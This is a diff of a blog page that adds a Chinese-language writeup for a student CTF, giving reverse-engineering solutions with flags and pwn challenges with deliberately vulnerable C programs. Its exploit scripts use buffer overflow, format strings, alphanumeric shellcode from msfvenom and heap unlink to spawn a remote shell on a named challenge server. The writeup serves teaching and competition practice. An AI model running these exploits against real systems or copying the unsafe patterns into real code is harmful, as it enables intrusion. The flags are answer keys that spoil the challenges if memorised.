+flag：wectf{x0r_s0_e4sy}
+xor
+cmp
+windows系统
+flag:flag{412accbb6e9ffbeef39e317d0862b9ab}
+思路：flag分成几段比较
+
+
+assembly
+题目
+push    rbp
+mov     rbp, rsp
+sub     rsp, 10h
+mov     [rbp+var_4], 0
+jmp     short s1
+
+s2:
+mov     eax, [rbp+var_4]
+cdqe
+movzx   eax, s[rax]
+add     eax, 14h
+mov     edx, eax
+mov     eax, [rbp+var_4]
+cdqe
+mov     s[rax], dl
+add     [rbp+var_4], 1
+
+s1:
+cmp     [rbp+var_4], 25h
+jle     short s2
+mov     esi, offset s
+mov     edi, offset format ; &amp;quot;%s&amp;quot;
+mov     eax, 0
+call    _printf
+mov     eax, 0
+leave
+retn
+
+s的数据为:
+52 58 4D 53 67 51 22 4F  1C 52 23 4E 52 1C 50 4D
+1F 52 1D 4F 23 23 4F 22  50 4F 4E 4F 23 1D 4D 20
+21 1c 4d 21 1e 69
+
+flag:flag{e6c0f7bf0da3f1c77c6dcbc71a450a52}
+思路:题目直接给出一段汇编，通过阅读可以发现，s的数据会经过加法然后输出。可以还原代码
+flag = [0x52,0x58,0x4D,0x53,0x67,0x51,0x22,0x4F,0x1C,0x52,0x23,0x4E,0x52,0x1C,0x50,0x4D,0x1F,0x52,0x1D,0x4F,0x23,0x23,0x4F,0x22,0x50,0x4F,0x4E,0x4F,0x23,0x1D,0x4D,0x20,0x21,0x1c,0x4d,0x21,0x1e,0x69]
+flags = &amp;quot;&amp;quot;
+for q in flag:
+    flags+= chr(q+20)
+
+print flags
+#flag{e6c0f7bf0da3f1c77c6dcbc71a450a52}
+
+base64
+linux系统
+flag:flag{787912e6b3b4c32f651e6b914382e3a9}
+思路：
+base64加密或对比，进入base64函数后会经过一个循环改变初始table的值
+
+
+.........
+king
+linux系统
+flag:wectf{2d6915e15c7bdffe2b470c1648a79717}
+思路:
+里边就是一个凯撒加密，移的位数为7
+
+
+k
+.........
+网
+.Net程序调试
+先用de4dot清理程序
+之后使用dnSpy在程序入口点下断点，单步运行就能在下面的变量框看见flag
+
+
+wectf{54sa58A92w6sa26a5Ssa88x9aw8wa56xW}
+19abe65fdc1875edabc521e215693edf.exe
+sign
+.Net程序
+flag:wectf{welc0mE_To_Csharp}
+思路:
+直接调用标准aes加密，函数名字也已经给出。
+
+可以直接网上解密得到flag
+
+
+sign_in.exe
+emmm
+flag:flag{a7b8d813f9d9a9b9c9ee4}
+思路:里边是MersenneTwister随机数生成算法，输入的字符串每一个都会被当做seed并生成对应的随机数，比较。
+读取出数据，爆破即可。
+en = [
+0x9901A900,0x3BCDF063,
+0xD641F85A,0x6E9ED707,
+0xB24BCDFE,0xD641F85A,
+0x17D5F1CD,0xBB75DDDA,
+0xFBF3FF55,0x8B1C9608,
+0xFBF3FF55,0x4D0C01AA,
+0xACFCBBFE,0x9901A900,
+0x165C8BCF,0x8B1C9608,
+0x165C8BCF,0xD641F85A,
+0x165C8BCF,0xBB75DDDA,
+0x165C8BCF,0xAC1A7281,
+0x165C8BCF,0x8432B35F,
+0x8432B35F,0xD2B75BF5,
+0x81b8cbbd]
+flag = &amp;quot;&amp;quot;
+for q in en:
+    for i in range(127):
+        temp = MT19937(i).extract_number()
+        if (temp==q):
+            flag += chr(i)
+            break
+print flag
+
+
+emmm
+Pwn
+BOF
+变量覆盖
+BOF
+源码：
+#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;stdlib.h&amp;gt;
+
+void pwn(void){
+  system(&amp;quot;sh&amp;quot;);
+}
+
+int main()
+{
+  char ipt[16];
+  int root = 0;
+  printf(&amp;quot;Welcome to wectf!\n&amp;quot;);
+  printf(&amp;quot;Do you know BOF??\n&amp;quot;);
+  printf(&amp;quot;&amp;gt;&amp;quot;);
+  scanf(&amp;quot;%s&amp;quot;, ipt);
+  if(root == 1){
+    printf(&amp;quot;good job!&amp;quot;);
+    pwn();
+  }
+  else{
+    printf(&amp;quot;yeah! good bye!\n&amp;quot;);
+  }
+  return 0;
+}
+
+编译：
+gcc -fno-stack-protector BOF.c -o BOF
+
+我关闭了栈保护，这个题有多解
+
+ipt 和 root 相距 28
+from pwn import *
+
+host = &#39;&#39;
+port = 0000
+r = remote(host, port)
+exp = &#39;k&#39; * 28 + p64(1)
+r.sendline(exp)
+r.interactive
+
+nc(pwn签到)
+// filename:1.c
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdint.h&amp;gt;
+const uint64_t a = 0x123456789abcdef0;
+
+int main()
+{
+    int i;
+    uint64_t c,total;
+    for (c=0, i=0, total=0; i++&amp;lt;5; )
+    {
+        scanf(&amp;quot;%lu&amp;quot;,&amp;amp;c);
+
+        total += c;
+    }
+
+    total == a?system(&amp;quot;/bin/sh&amp;quot;):printf(&amp;quot;try again.\n&amp;quot;);
+    return 0;
+}
+
+//gcc ./1.c -o pwn1 &amp;amp;&amp;amp; strip ./pwn1
+
+pwn基本操作nc或者pwntools使用,基本逆向能力.
+exp:
+python -c &amp;quot;from pwn import *;p=remote(&#39;39.98.246.99&#39;,10040);p.sendline(&#39;{}\n&#39;.format(0x123456789abcdef0/5));p.interactive()&amp;quot;
+
+.........
+Stack_balance
+//filename: 2.c
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+void input()
+{
+    int a[100] = {0};
+    int i = 0;
+    for (;i&amp;lt;100;i++)
+        scanf(&amp;quot;%d&amp;quot;,&amp;amp;a[i]);
+}
+
+void check()
+{
+    int b[100];
+    int c;
+    c = b[0]==1 &amp;amp;&amp;amp; b[99] == 100;
+    c?system(&amp;quot;/bin/sh&amp;quot;):printf(&amp;quot;try again.\n&amp;quot;);
+}
+
+int main()
+{
+    input();
+    check();
+    return 0;
+}
+
+//gcc ./2.c -o pwn2 &amp;amp;&amp;amp; strip ./pwn2
+
+考察堆栈平衡定理
+exp:
+python -c &amp;quot;from pwn import *;p=remote(&#39;39.98.246.99&#39;,10037);p.sendline(&#39;\n&#39;.join([str(x) for x in xrange(1,101)]));p.interactive()&amp;quot;
+
+Login
+//filename: 3.c
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;time.h&amp;gt;
+int verify(char * ps)
+{
+    int i = 0;
+    srand(time(0));
+    for(;ps[i]&amp;amp;&amp;amp;i&amp;lt;15;i++)
+        if (ps[i] != (rand() % 86))
+            return 0;
+    return 1;
+}
+int login()
+{
+    char username[16] = {0};
+    char password[16] = {0};
+    printf(&amp;quot;what your name: \n&amp;quot;);
+    read(0,username,15);
+    printf(&amp;quot;Hello, %s&amp;quot;,username);
+    read(0,password,15);
+    return verify(password);
+}
+
+
+int main()
+{
+    int a,b;
+    setbuf(stdin,0);
+    setbuf(stdout,0);
+    if(login())
+    {
+        printf(&amp;quot;login success!\nDo you find a number: \n&amp;quot;);
+        a = b = rand();
+        scanf(&amp;quot;%d&amp;quot;, &amp;amp;a);
+        a==b?system(&amp;quot;/bin/sh&amp;quot;):printf(&amp;quot;wrong answer.\n&amp;quot;);
+    }
+    else
+    {
+        printf(&amp;quot;login fails\n&amp;quot;);
+    }
+
+    return 0;
+}
+
+//gcc ./3.c -o pwn3
+
+简单逻辑漏洞和scanf漏洞:
+当password第一个字节为\x00时, for循环条件判断不成立, 直接return.
+scanf当格式化控制符为“%d”时,可用+-\特殊符号跳过输入且不改变原值.
+exp:
+from pwn import *
+
+p = remote(&#39;39.98.246.99&#39;, 10036)
+p.recvuntil(&amp;quot;what your name: \n&amp;quot;)
+p.sendline(&#39;ads&#39;)
+p.recvuntil(&amp;quot;\n&amp;quot;)
+p.sendline(&#39;\x00&#39;)
+p.recvuntil(&amp;quot;: \n&amp;quot;)
+p.sendline(&#39;+&#39;)
+p.interactive()
+
+Shellcode
+此题目需要使用32位编译,如果不能编译请安装运行库gcc-multilib
+如果不能运行参考https://blog.csdn.net/kingroc/article/details/51143327
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+int main()
+{
+    setbuf(stdin,0);
+    setbuf(stdout,0);
+    char shellcode[0x100] = {0};
+    void (*func)();
+    int i;
+    printf(&amp;quot;Do you know shellcode?\ngive me your shellcode:\n&amp;quot;);
+    read(0,shellcode,0x100);
+    for(i=0;i&amp;lt;0x100;i++)
+    {
+        char c = shellcode[i];
+        if(c&amp;gt;=&#39;0&#39; &amp;amp;&amp;amp; c&amp;lt;=&#39;9&#39; || c&amp;gt;=&#39;A&#39; &amp;amp;&amp;amp; c&amp;lt;=&#39;Z&#39; || c&amp;gt;=&#39;a&#39; &amp;amp;&amp;amp; c&amp;lt;=&#39;z&#39;)
+            continue;
+        else
+            return 1;
+    }
+    func = shellcode;
+    func();
+    return 0;
+}
+// gcc -m32 -z execstack ./4.c -o pwn4
+
+
+特殊的shellcode,必须为可打印字符:
+shellcode生成:
+可使用msf
+msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&amp;quot;/bin/sh&amp;quot; -e x86/alpha_upper BufferRegister=eax
+也可使用github上项目:
+https://github.com/ecx86/shellcode_encoder:
+python -c &amp;quot;from pwn import *;p=remote(&#39;127.0.0.1&#39;,10001);p.recvuntil(&#39;:\n&#39;);p.sendline(&#39;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI3ZTKV8J9V2RF2H6M3SLIJGSX6OD3SX30RH6ORBU92NMYZC62KX385P30C06OU2BIBNVOBS3XUP67V3MYM18MMPAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;);p.interactive()&amp;quot;
+
+easystack
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdint.h&amp;gt;
+
+void pwn_init()
+{
+    setbuf(stdin,0);
+    setbuf(stdout,0);
+}
+
+void vuln()
+{
+    char buf[10] = {0};
+    printf(&amp;quot;What&#39;s your name?\n&amp;quot;);
+    read(0,buf,0x100);
+    printf(&amp;quot;Hello %s&amp;quot;, buf);
+}
+
+int main()
+{
+    pwn_init();
+    vuln();
+
+    return 0;
+}
+//gcc -m32 -fno-stack-protector 5.c -o pwn5
+
+32位普通栈溢出,给不给libc看情况
+fmt
+格式化串盲打,不给bin文件
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+void main()
+{
+    char buf[0x100];
+    while (1)
+    {
+        memset(buf,0,0x100);
+        read(0, buf, 0x100);
+        printf(buf);
+        fflush(stdout);
+    }
+}
+
+//gcc ./6.c -m32 -o fmt
+
+首先确定偏移
+from pwn import *
+p = remote(&#39;127.0.0.1&#39;, 10001)
+def leak(payload):
+    p.sendline(payload)
+    return p.recv()
+
+auto = FmtStr(leak) 
+log.success(auto.offset)
+
+# [*] Found format string offset: 7
+
+然后通过格式化字符串漏洞leak出内存中的bin文件,默认加载地址(no pie)32位0x8048000(64位0x400000).
+from pwn import *
+#context.log_level = &#39;debug&#39;
+p = remote(&#39;172.16.29.145&#39;, 10001)
+#def leak(payload):
+#    p.sendline(payload)
+#    return p.recv()
+
+#auto = FmtStr(leak)
+#log.success(auto.offset)
+
+def dump(addr):
+    payload = &amp;quot;&amp;quot;
+    for x in xrange(5):
+        try:
+            payload = &amp;quot;AAA%10$sBBBB&amp;quot;+p32(addr)
+            if &#39;\x0a&#39; in payload:
+                return &#39;\xff&#39;
+            p.send(payload)
+            data = p.recv(timeout=3)
+            if data:
+                start = data.find(&amp;quot;AAA&amp;quot;)+3
+                end = data.find(&amp;quot;BBBB&amp;quot;)
+            result = data[start:end]
+            if result == &amp;quot;&amp;quot;:
+                return &#39;\x00&#39;
+            else:
+                return result
+            return &#39;\xff&#39;
+        except EOFError:
+            log.waring(&amp;quot;excpet &amp;quot;, exec_info = sys.exc_info())
+    return &#39;\xff&#39;
+
+def create():
+    base=0x8048000
+    leaked = &amp;quot;&amp;quot;
+    while len(leaked) &amp;lt; 8000:
+        address = base+len(leaked)
+        if len(leaked) == 0x74b:
+            sleep(1)
+        tmp = dump(address)
+        leaked += tmp
+        log.info(hexdump(leaked))
+        with open(&#39;elf&#39;,&#39;wb&#39;) as f:
+            f.write(leaked)
+create()
+
+对dump出的文件简单分析恢复其main函数
+
+
+
+
+
+确定到got起始地址为0x804a000
+然后leak确定libc版本与libc地址
+改printf got表为system地址即可
+exp:
+from pwn import *
+
+p = remote(&#39;39.98.246.99&#39;, 10039)
+libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+payload = &amp;quot;%8$s&amp;quot;+p32(0x804a010)
+p.sendline(payload)
+libc.address = u32(p.recv(4))-libc.sym[&#39;printf&#39;]
+p.recv()
+payload = fmtstr_payload(7,{0x804a010:libc.sym[&#39;system&#39;]})
+p.send(payload)
+p.send(&#39;/bin/sh&#39;)
+p.interactive()
+
+unlink
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+typedef struct Chunk 
+{
+    struct Chunk * fd;
+    struct Chunk * bk;
+    char data[16];
+
+} chunk;
+void dosomething()
+{
+    system(&amp;quot;/bin/sh&amp;quot;);
+}
+
+void unlink(chunk * p)
+{
+    chunk * FD = p-&amp;gt;fd;
+    chunk * BK = p-&amp;gt;bk;
+    FD-&amp;gt;bk = BK;
+    BK-&amp;gt;fd = FD;
+}
+
+void pwn_init()
+{
+setbuf(stdin,0);
+setbuf(stdout,0);
+alarm(60);
+}
+
+int main()
+{
+	pwn_init();
+malloc(1024);
+    chunk * a = malloc(sizeof(chunk));
+    chunk * b = malloc(sizeof(chunk));
+    chunk * c = malloc(sizeof(chunk));
+
+    a-&amp;gt;fd = b;
+    b-&amp;gt;bk = a;
+    b-&amp;gt;fd = c;
+    c-&amp;gt;bk = b;
+
+    printf(&amp;quot;gift: %p %p\n&amp;quot;, a, &amp;amp;a);
+    
+    gets(a-&amp;gt;data);
+    unlink(b);
+    return 0;
+}
+
+重点在于如何将代码段的地址写到返回地址,发现返回地址最后来源于[ecx-4],所以构造[ecx-4]=dosomething地址即可
+
+exp:
+from pwn import *
+
+filename = &amp;quot;./myunlink32&amp;quot;
+elf = ELF(filename)
+#p = process(filename)
+p = remote(&amp;quot;39.98.246.99&amp;quot;,10042)
+a = p.recvline().split(&#39; &#39;)
+t16 = lambda x: int(x,16)
+heap,stack = map(t16,a[1:])
+#gdb.attach(p,&#39;b unlink\nc\n&#39;)
+payload = p32(0x804856b)*6 + p32(stack+12) + p32(heap+12)
+p.sendline(payload)
+
+p.interactive()
+
+
+                                        </div>
+                                        
+                                            <a class="btn btn-text" href="https://we-ax.github.io/post/wectf1-writeup">Read More ~</a>
+                            </div>
+                </div>
+            </article>
+            
+            <article class="post i-card">
+                <h2 class="post-title">
                     <a href="https://we-ax.github.io/post/2019-techworld-xin-xi-an-quan-tiao-zhan-sai">
                         2019 TechWorld 信息安全挑战赛
                     </a>
@@ -107,7 +1454,7 @@
                     <time class="post-time">2019-10-05</time>
                     
                         <a href="https://we-ax.github.io/tag/4REPgFG5c" class="post-tag i-tag
-                            i-tag-banana">
+                            i-tag-info">
             #writeup
         </a>
                         
@@ -141,7 +1488,7 @@
                     <!-- 个人信息 -->
                     
     <div class="id_card i-card">
-        <div class="id_card-avatar" style="background-image: url(https://we-ax.github.io/images/avatar.png?v=1570298648399)">
+        <div class="id_card-avatar" style="background-image: url(https://we-ax.github.io/images/avatar.png?v=1570367949691)">
         </div>
         <h1 class="id_card-title">
             We_ax
